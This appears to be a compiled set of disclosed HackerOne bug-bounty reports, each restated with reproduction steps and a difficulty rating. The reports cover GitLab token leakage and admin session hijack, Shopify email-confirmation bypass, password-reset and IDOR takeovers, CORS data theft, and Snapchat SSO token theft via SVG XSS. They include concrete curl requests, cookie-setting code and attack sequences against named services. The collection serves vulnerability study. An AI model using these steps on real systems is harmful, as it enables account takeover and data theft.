The vulnerability involves unauthorized access to Personally Identifiable Information (PII) via a WordPress REST API endpoint (wp-json/wp/v2/users/15) that exposes administrator email addresses without authentication. This information can be used for password reset attacks or brute-force attempts. Additionally, a CORS misconfiguration (Access-Control-Allow-Credentials: true) allows attackers to steal this data via a malicious website when visited by a logged-in user.

Steps to Reproduce:
1. Navigate to https://www.mtn.com/wp-json/wp/v2/users/15
2. Intercept the request with Burp Suite or browser developer tools to observe the exposed administrator email address (PII)
3. Create an HTML file with the provided exploit script and open it in a browser
4. Click the 'Exploit' button to send the stolen data to an attacker-controlled server
Exploitation Difficulty:
The vulnerability is relatively straightforward to discover as it involves accessing a well-known WordPress REST API endpoint and observing the exposed data. The CORS misconfiguration is also a common issue that can be easily tested. No complex application state manipulation or novel logic is required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/268794: all private tokens are leaked to an unauthenticated attacker
================================================================================
RAW DESCRIPTION:

Using the api, one can obtain the authentication token for any user on gitlab:
Code 104 Bytes
1$ curl -s --request GET https://gitlab.com/api/v4/users/951422 | jq '.authentication_token'
2"[redacted]"
We can then use this token to impersonate any user to perform any action they can perform:
$ curl --request POST --header "PRIVATE-TOKEN: [redacted]" https://gitlab.com/api/v4/projects/3831210/issues?title=owned
Code 1014 Bytes
1{"id":6843690,"iid":4,"project_id":3831210,"title":"owned","description":"","state":"opened","created_at":"2017-09-15T21:58:06.342Z","updated_at":"2017-09-15T21:58:06.342Z","labels":[],"milestone":null,"assignees":[],"author":{"id":951422,"name":"Andrew Drake","username":"adrake","state":"active","avatar_url":"https://secure.gravatar.com/avatar/5cd00179addefbca6d635845534a1ee6?s=80&d=identicon","web_url":"https://gitlab.com/adrake"},"assignee":null,"user_notes_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"weight":null,"web_url":"https://gitlab.com/karmiclabs/slabricator/issues/4","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"_links":{"self":"http://gitlab.com/api/v4/projects/3831210/issues/4","notes":"http://gitlab.com/api/v4/projects/3831210/issues/4/notes","award_emoji":"http://gitlab.com/api/v4/projects/3831210/issues/4/award_emoji","project":"http://gitlab.com/api/v4/projects/3831210"},"subscribed":true}



================================================================================
Vulnerability Description:
The vulnerability allows an unauthenticated attacker to retrieve the authentication tokens of any GitLab user via the API, enabling them to impersonate the user and perform any actions the user is authorized to do.

Steps to Reproduce:
1. Use the GitLab API to retrieve the authentication token for any user by sending a GET request to `https://gitlab.com/api/v4/users/{user_id}` and parsing the `authentication_token` field from the response.
2. Use the obtained token to impersonate the user by including it in the `PRIVATE-TOKEN` header of subsequent API requests, such as creating an issue in a project.
Exploitation Difficulty:
The attack is straightforward, involving only two simple steps: retrieving the token and using it. There are no complex interactions or states to manipulate, and the logic is not novel or non-obvious.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/493324: Privilege escalation from any user (including external) to gitlab admin when admin impersonates you
================================================================================
RAW DESCRIPTION:

Summary:
Hey team,
I have discovered a way for any logged in user (attacker) to escalate his privileges to gitlab administrator if the real gitlab administrator impersonates attacker's account.
Description:
When the gitlab admin impersonates some user, he gets new _gitlab_session cookie and then clicking at Stop impersonating he gets his own admin's cookie back. The vulnerability is that the impersonated user (attacker in our case) can see impersonated session at the Active sessions so he can switch to it (manually setting it in cookie) and click Stop impersonating by himself. This is a way how he can become gitlab administrator.
Steps To Reproduce:
Sign into gitlab app as some user (attacker)
Go to the active sessions settings tab and revoke all the sessions besides the current active one
Sign into gitlab app in other browser as administrator (admin)
Go to users admin section and impersonate attacker user
<image_0>
Inspect the Revoke button and make sure you see the session ID there. Copy it. ████
Go to index page of gitlab as attacker (http://gitlab.bb/ in my case), I do not know why, but it is important step
Clear attacker browser's cookie
Open the developer console as attacker and manually set _gitlab_session to the copied one with:
Code 42 Bytes
1document.cookie = "_gitlab_session=█████";
<image_1>
Click Stop impersonating at the top-right corner as attacker and make sure you are now logged in as gitlab admin. ███
Impact
Every gitlab authenticated user can escalate his privileges to admin ones and give complete access to all gitlab services, projects and abilities. Only he needs to do is ask admin to impersonate his account because of something works bad there.



================================================================================
Vulnerability Description:
This vulnerability allows a regular GitLab user to gain administrator privileges when an administrator uses the impersonation feature to access their account. The issue occurs because the impersonated user can access and hijack the administrator's impersonation session, then exit the impersonation mode to gain the administrator's original privileges.

Steps to Reproduce:
1. Login to GitLab as a normal user (the 'attacker')
2. Navigate to the Active Sessions settings tab
3. Revoke all sessions except your current active session
4. Have a GitLab administrator login (in a different browser) and impersonate your account
5. As the attacker, refresh your Active Sessions page - you'll now see a second active session (this is the administrator's impersonation session)
6. Inspect the 'Revoke' button for this second session and copy the session ID
7. Navigate to the GitLab homepage (http://gitlab.bb/ in the example)
8. Clear your browser cookies
9. Open developer console and manually set the GitLab session cookie to the copied session ID
10. Refresh the page - you are now in the administrator's impersonation session
11. Click 'Stop impersonating' in the top-right corner
12. You now have full administrator access to GitLab
Exploitation Difficulty:
This vulnerability involves understanding how the session impersonation feature works in different contexts, one from the user side and one from the admin side. It also contains a non-obvious interaction logic between the impersonated and impersonator, namely that the current session ID of the impersonator would be saved and stored on the client side, and readable to the impersonated user.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/544334: [Critical] Possibility to takeover any user account #2 without interaction on the https://██████████
================================================================================
RAW DESCRIPTION:

Description
Hello. This time I discovered a way to tekeover any user's account via unsafe password reset.
This time it's much easier than #1 way in the #543678 report.
When users requests the password reset, the next link is come to the email:
Code 56 Bytes
1https://█████/resetpassword.aspx?ru=[user_id]&op=[token]
The [user_id] is numeric, always same for same emaill, and incremental for every new user.
The [token] parameter is random and used to protect the link from hijacking.
But, I discovered that Reset password endpoint accepts empty token!
So all the attacker needs, it's to initiate password reset for the victim's email, and request the
Code 54 Bytes
1https://██████████/resetpassword.aspx?ru=[user_id]&op=
Since [user_id] is numeric and static for same account, it can be easily guessed by the attacker.
POC
1) Go to the https://█████/ForgotPassword.aspx
2) Initiate reset password for the ██████ (it's my test account)
3) Use this link:
Code 42 Bytes
1https://███/resetpassword.aspx?ru=7655&op=
where 7655 - it's my user numeric ID (as we know, it's incremental, and be easily guessed for other accounts).
██████████
4) Set the new password and confirm it. You can set something as 111111111aA!!!! to pass the password requirements.
5) You will be logged into my organization as admin.
Suggested fix
Fix the op tooken validation - it should be checked properly.
Impact
Severity: Critical
Immediate account Individual/Cprporate account takeover via password reset. Attacker needs to know only email.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to take over any user's account by exploiting an unsafe password reset mechanism. The reset password endpoint accepts an empty token parameter, making it possible to bypass the token validation. By guessing the incremental user ID, an attacker can reset the password of any account without needing the valid token.

Steps to Reproduce:
1. Go to the password reset page (https://█████/ForgotPassword.aspx) and initiate a password reset for the target email.
2. Construct the reset password URL without the token parameter: https://███/resetpassword.aspx?ru=[user_id]&op= where [user_id] is the numeric ID of the target user (can be guessed as it is incremental).
3. Access the constructed URL, set a new password, and gain access to the victim's account.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a simple manipulation of the password reset URL by omitting the token parameter. The incremental nature of the user ID makes it easy to guess, and the lack of token validation is a common oversight in password reset implementations.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/910300: Email Confirmation Bypass in your-store.myshopify.com which leads to privilege escalation
================================================================================
RAW DESCRIPTION:

Hello Shopify, I have found a bug by which I can verify any email on .myshopify.com, the bug is very strange but it works. Also I can take over the accounts but only the ones which do not have SSO.
To reproduce please follow the steps exactly as I written otherwise you will not be able to reproduce it.
Steps to reproduce:
<image_0>
<image_1>
<image_2>
<image_3>
<image_4>
<image_5>
<image_6>
In burp check match and replace again to replace your email with the email you want to takeover(same as above)
Go to your email which you own where is the confirmation link and click on it(in the browser where you are already logged in)
<image_7>
Now click on Review accounts
Enter stores password and you'll be greeted with Shopify ID
<image_8>
<image_9>
<image_10>
Now you can access vitims store and partner account without any problems
Impact
Ability to confirm any email on your-store.myshopify.com and leverage SSO to take over accounts.



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to bypass email confirmation on .myshopify.com, enabling them to verify any email and potentially take over accounts that do not use SSO. By manipulating the email confirmation process, the attacker can gain unauthorized access to the victim's store and partner account.

Steps to Reproduce:
1. Use Burp Suite to intercept and replace the email in the confirmation request with the target email.
2. Click the confirmation link in the browser where you are already logged in.
3. Navigate to 'Review accounts' and enter the store's password.
4. Access the victim's store and partner account via Shopify ID.
Exploitation Difficulty:
The attack involves multiple components including email interception, session manipulation, and exploiting the confirmation process. The interaction between these components is subtle and requires precise execution to succeed. Additionally, the attack manipulates complex application states during the email confirmation and account review phases.

--------------------------------------------------------------------------------



Incorrect Authorization Vulnerabilities (2 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1714638: IDOR Leads To  User Profile Modification https://mtnmobad.mtnbusiness.com.ng/app/updateUser
================================================================================
RAW DESCRIPTION:

Summary:
Hello Team,
https://mtnmobad.mtnbusiness.com.ng/app/updateUser allows authenticated users to alter their account profile. But, however, there is no authorization check when updating another user's profile thus, allowing attacker to modify anyone's profile info such as Username, Address, Mobile Number, Company Name and Company Size
Steps To Reproduce:
Requirements:
Create two Test Accounts (Attacker & Victim)
Login into attacker's account In Mozilla Firefox at https://mtnmobad.mtnbusiness.com.ng/#/login1.
Visit https://mtnmobad.mtnbusiness.com.ng/#/userProfile
Goto to Burp and turn Intercept is on to capture request.
Locate this endpoint POST /app/updateUser HTTP/1.1 while still proxying traffic through Burp. Notice, json blob data being presented.
Record "id":"/###", "email":"redacted+attacker@wearehackerone.com" for attacker's account and Logout.
Now, Login into victim's account and repeat step [1, 2 & 3] and Logout.
Attack Steps
Login into attacker's account in Mozilla Firefox and Victim's Account in Google Chrome.
Using attacker's account in Firefox, visit https://mtnmobad.mtnbusiness.com.ng/#/userProfile and capture request with Burp.
Switch attacker's "id":"/redacted", "email":"redacted+attacker@wearehackerone.com" to victim "id":"/redacted" "email":"redacted+victim@wearehackerone.com" and forward request.
Go to victim's account in google chrome and refresh the page.
Visit victim's profile and notice, attacker has successfully updated the user's Profile without their knowledge.
Recommendation/Remediation:
Implement stringent authorization controls to make sure a user has the necessary rights before allowing them to make such a harmful request on another account.
Generate random userIds to prevent attacker from predicting such userIds.
Supporting Material/References:
Screenshots:
<image_0>
After:
<image_1>
[attachment / reference]
Tools
BurpSuite Community Edition: [v2022.8.4]
Morzila Firefox: 105.0.1 (64-bit)
Google Chrome: Version 105.0.5195.127 (Official Build) (64-bit)
OS: Microsoft Windows [Version 10.0.22000.856]
Impact
An attacker will be able to use this technique to change any user's (advertiser's) profile, for example, a company name and phone number under the attacker's control to commit a crime entirely in the victim's name.
Regards!
@v3rvain0001



================================================================================
Vulnerability Description:
The vulnerability is an Insecure Direct Object Reference (IDOR) that allows an authenticated attacker to modify any user's profile information by manipulating the user ID in the update request, bypassing authorization checks.

Steps to Reproduce:
1. Create two test accounts (Attacker & Victim) and log in to the attacker's account.
2. Capture the profile update request using Burp Suite while logged in as the attacker.
3. Modify the captured request to replace the attacker's user ID and email with the victim's details.
4. Forward the modified request and observe the victim's profile is updated without authorization.
Exploitation Difficulty:
The attack involves straightforward manipulation of a single request parameter (user ID) without requiring complex interactions or understanding of multiple components. The vulnerability is a common IDOR flaw with no novel or subtle logic involved.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/498964: Full access to internal Gitlab instances at redash.gitlab.com, dashboards.gitlab.com, prometheus.gitlab.com
================================================================================
RAW DESCRIPTION:

Summary:
Lack of proper ticket trick security leads to internal access on Gitlab instances. **I did not use support.gitlab.com instead just using support@gitlab.com email was suffice.
Description:
Getting a support@gitlab.com Google Account
After the Ticket Trick attack that Inti reported and disclosed, many companies including Gitlab added proper security measures to prevent this kind of attack. What companies did not realize is that Zendesk has a feature that can be exploited by attackers other than the CC feature.
In this case, Gitlab has blocked sending emails to support+*@gitlab.com which prevents Ticket Trick that Inti came up with. However, the CC feature along with the Zendesk's feature can lead to further exploitation.
To begin with, I sent an email to support@gitlab.com. After this, an automated reply was sent by Gitlab with confirmation that my ticket went through. Next, I went to accounts.google.com and registered support@gitlab.com. For the firstname and last name I copied a special hash for the ticket. Zendesk as a feature has a special hash for each ticket that is generated in the system This hash is like the key in a dictionary and can be used to add more content to the ticket. So by getting that hash and sending the request, Google allegedly sends an email to verify.
What happened here was due to Zendesk's own security measures, the first email from Google will be set as private because they are not CCed to my ticket. So then, I replied to the support ticket from Gitlab and in CC put noreply@google.com. Once this was done, I replayed the request in Google and again tried to verify support@gitlab.com this time the ticket had the verification code public.
{F427388}
If you check the image on the top right corner you can see the hash repeated twice because I put that as a first and last name.
Once this was done, I had a verified support@gitlab.com email.
{F427390}
Next, I went to crt.sh to search for gitlab.com domains and found 3 domains that stood out:
prometheus.gitlab.com
{F427391}
redash.gitlab.com
{F427393}
<image_0>
Impact
Getting access to internal applications.



================================================================================
Vulnerability Description:
The vulnerability involves exploiting Zendesk's ticket system and Google's email verification process to gain unauthorized access to internal GitLab instances. By manipulating the ticket hash and leveraging Zendesk's features, an attacker can verify a support@gitlab.com email and use it to access sensitive internal systems.

Steps to Reproduce:
1. Send an email to support@gitlab.com to initiate a support ticket.
2. Register a Google account with the email support@gitlab.com, using the ticket hash as the first and last name.
3. Reply to the support ticket from GitLab, CC'ing noreply@google.com to make the verification code public.
4. Verify the support@gitlab.com email using the public verification code.
5. Use the verified email to gain access to internal GitLab instances like redash.gitlab.com, dashboards.gitlab.com, and prometheus.gitlab.com.
Exploitation Difficulty:
This vulnerability requires understanding and manipulating multiple systems (Zendesk, Google email verification, GitLab's internal domains) and involves subtle interactions between these components. The attacker must also recognize the opportunity to use the ticket hash in a non-obvious way to bypass security measures.

--------------------------------------------------------------------------------



Authentication Bypass Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/265943: Stealing SSO Login Tokens (snappublisher.snapchat.com)
================================================================================
RAW DESCRIPTION:

Description
Attacker can steal SSO login tokens for snappublisher.snapchat.com by chaining different flaws in SSO and Snapchat’s Snappublisher tool. Detailed attack flow is as follows.
Attack Flow
1.. Snapchat fetches a SSO LOGIN TOKEN from accounts.snapchat.com to login into different products of Snapchat i.e. SnapPublisher, Ads Manager, Business Manager, etc. provided that user is logged into accounts.snapchat.com.
eg. To login into SnapPublisher following requests are made …
1] https://accounts.snapchat.com/accounts/login?client_id=creativesuite-prod&referrer=https://snappublisher.snapchat.com/sso_continue
2] 302 redirect to
https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=https%3A%2F%2Fsnappublisher.snapchat.com%2Fsso_continue
3] again 302 redirect to
https://snappublisher.snapchat.com/sso_continue?ticket=redacted
So, a SSO login token ticket is sent from accounts.snapchat.com to snappublisher.snapchat.com which is used to login the user. And is also used in Authorization header when making requests to API.
Now, we are going to steal this SSO login token ticket which will allow us to login and control victim’s account.
2.. On snappublisher.snapchat.com, I was able to upload a svg image to google cloud storage, using which I run my javascript code.
Note: Use import from site functionality via https://snappublisher.snapchat.com/snaps/create/new and import my xss-svg image from here (███████/tokenstealer.svg). This alerts and logs #hashfragment in the console.
I have already did this in my POC so this is just for understanding purpose. My image URL is https://snappublisher.snapchat.com/api/v1/media/████████/file/somthine.svg?%23pranav
3.. Now, other flaws in SSO …
1] In this URL
https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=https://snappublisher.snapchat.com/api/v1/media/████████/file/somthine.svg?%23pranav
referrer parameter can be controlled and any snappublisher.snapchat.com URL is allowed.
Also, %23pranav, this #hashfragment is allowed in referrer parameter.
I take advantage of both these flaws to flow the SSO login token to my website or land to a page which I control.
Note: #hashfragment is send further by browser for 302 / 307 redirects.
4.. CSRF Login flaw
SSO functionality is vulnerable to CSRF attack so I can login other people into my account. I use this functionality to login user into my account.
5.. Token doesn’t expire flaw
Once the SSO login token is used, it doesn’t expire and can be reused multiple times.
So, simple attack flow is as follows :
User is logged into accounts.snapchat.com.
Attacker logs user into his/her snappublisher.snapchat.com account via CSRF login flaw.
Now, attacker makes a request to fetch SSO login token https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=https://snappublisher.snapchat.com/api/v1/media/█████████/file/somthine.svg?%23pranav and redirects the token in #hashfragment to https://snappublisher.snapchat.com/api/v1/media/█████/file/somthine.svg?%23pranav
https://snappublisher.snapchat.com/api/v1/media/████/file/somthine.svg?%23pranav this redirects with 307 status code to storage.googleapis.com/creativesuite-prod-media/* with SSO login token ticket in #hashfragment carried forward by browser.
Svg image executes my js code and alerts and logs the SSO login token ticket in the console.
I can use the ticket to login into victim’s account. Via https://snappublisher.snapchat.com/sso_continue?ticket=<stolen token>
Proof Of Concept
Video POC : █████████(Unlisted video on youtube)
Login into your account on accounts.snapchat.com.
Login into your SnapPublisher account snappublisher.snapchat.com.
Visit (█████) which fetches user’s SSO login token which can be used to login. (This alerts and logs the token in console.)
Use the token via https://snappublisher.snapchat.com/sso_continue?ticket=<stolen token>
Impact
Gain unauthorized access to Snappublisher account.
Can use the SSO login token to make API requests.
Recommendations
For SSO functionality …
1] Add state param to prevent CSRF login on https://snappublisher.snapchat.com/sso_continue?ticket=<token>
2] In referrer param of the following URL
https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=https://snappublisher.snapchat.com/api/v1/media/██████████/file/somthine.svg?%23pranav disallow #hashfragments to be included.
3] Make the referrer param of the following URL
https://accounts.snapchat.com/accounts/sso?client_id=creativesuite-prod&referrer=https://snappublisher.snapchat.com/api/v1/media/███████/file/somthine.svg?%23pranav more specific and restricted similar to your OAuth2 adsapi.
4] SSO login token should be one time use and should not be able to use it again and again.
For SnapPublisher
1] I observed you are using Google Cloud Storage, so blocking svg images or disallowing any uploads of svg-xss images will further enhance security. Otherwise, one can easily get xss on storage.google
Let me know if you need any help. :-)
Regards,
Pranav Hivarekar



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to steal SSO login tokens for SnapPublisher by chaining multiple flaws, including CSRF, token reuse, and SVG-based XSS. The attacker can then use the stolen token to gain unauthorized access to the victim's SnapPublisher account.

Steps to Reproduce:
1. Upload an SVG image with malicious JavaScript to Google Cloud Storage via SnapPublisher's import functionality.
2. Use CSRF to log the victim into the attacker's SnapPublisher account.
3. Trigger a request to fetch the SSO login token, redirecting it to the malicious SVG via the referrer parameter and hash fragment.
4. Capture the SSO token from the SVG's JavaScript execution and use it to log into the victim's account.
Exploitation Difficulty:
The attack involves multiple components (CSRF, token handling, XSS via SVG) and requires understanding subtle interactions between them, such as how the referrer parameter and hash fragments are handled during SSO token redirection. Additionally, the attack manipulates complex application states (SSO flow, token validation) and includes novel logic not commonly seen in other applications.

--------------------------------------------------------------------------------



Incorrect Privilege Assignment Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/2808412: A potential risk in the experimental-programmatic-access-ccft which can be used to privilege escalation.
================================================================================
RAW DESCRIPTION:

Summary: I found a potential risk in the experimental-programmatic-access-ccft when I deployed it in the AWS Serverless Application Repository. A malicious can leverage the "sts:AssumeRole" permissions for "*" resources to escalate permission.
Description: The experimental-programmatic-access-ccft application creates a function named ExtractCarbonEmissionsFunction, and the associated role is assigned policies with permissions such as "sts:AssumeRole " for "*" resources. A malicious user can leverage the "sts:AssumeRole" permissions to assume into any AWS Account in the AWS Organization, resulting in privilege escalation. This poses a significant security risk to the account used to deploy the application.
Remediation Instructions
Use finer-grained authorization policies to replace the AWS-managed policies. And use the specific resource names to replace the "*".
The permissions for STS resources should be removed if they do not affect normal functionality.
Add a permissions boundary to restrict the permission.
Supporting Material/References:
Indicate the Amazon service or product that this vulnerability occurs on: (AWS S3, Amazon Lambda, etc): Amazon Lambda
Impact
Summary:
A malicious user could leverage these permissions to escalate his/her privilege.



================================================================================
Vulnerability Description:
The experimental-programmatic-access-ccft application creates a Lambda function with an IAM role that has overly permissive 'sts:AssumeRole' permissions for all resources ('*'). This allows a malicious user to assume any role in the AWS Organization, leading to privilege escalation.

Steps to Reproduce:
1. Deploy the experimental-programmatic-access-ccft application from the AWS Serverless Application Repository.
2. Inspect the IAM role associated with the ExtractCarbonEmissionsFunction to identify the overly permissive 'sts:AssumeRole' permission for '*' resources.
Exploitation Difficulty:
The vulnerability involves a straightforward inspection of IAM permissions and does not require complex interactions between components or manipulation of application states. The issue is relatively easy to identify once the IAM policies are reviewed.

--------------------------------------------------------------------------------



